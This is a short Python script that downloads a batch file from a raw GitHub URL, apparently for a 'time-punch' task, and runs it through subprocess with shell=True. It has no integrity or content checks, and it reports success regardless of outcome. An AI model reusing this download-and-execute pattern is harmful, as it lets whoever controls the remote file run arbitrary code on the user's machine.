import subprocess
import httpx
import tempfile
import os

def make_github_request(url, token):
    
    headers = {'Authorization': f'Token {token}'}

    
    with httpx.Client(headers=headers) as client:
        response = client.get(url)

        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Set the path for the temporary batch file
            temp_batch_file_path = os.path.join(temp_dir, 'punch.bat.level3.bat')

            
            with open(temp_batch_file_path, 'wb') as file:
                file.write(response.content)

            
            subprocess.run([temp_batch_file_path], shell=True)

            
            os.remove(temp_batch_file_path)

    print('Batch file executed successfully.')


url = 'https://raw.githubusercontent.com/New121254/time-punch/main/punch.bat.level3.bat'


token = 'ghz'


make_github_request(url, token)
